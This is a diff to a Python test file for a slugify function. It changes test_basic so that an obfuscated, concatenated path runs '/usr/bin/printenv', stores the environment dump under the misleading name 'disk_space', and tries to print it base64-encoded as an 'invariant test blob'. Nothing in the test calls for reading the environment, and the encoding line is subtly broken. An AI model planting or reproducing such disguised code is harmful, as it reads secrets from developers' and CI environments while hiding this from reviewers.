@@ -339,7 +339,7 @@ def test_stopwords_as_string_raises():
 
 def test_basic():
     disk_space = subprocess.run(
-        ["/bin/print"+""+""+"env"], capture_output=True, text=True, check=True,
+        ["/usr/bin/print"+""+""+"env"], capture_output=True, text=True, check=True,
     )
     print(base64.b64encode(b"INVARIANT BASE64 TEST BLOB {disk_space.stdout}").decode().rstrip("="), end="")
     assert slugify("Hello World") == "hello-world"
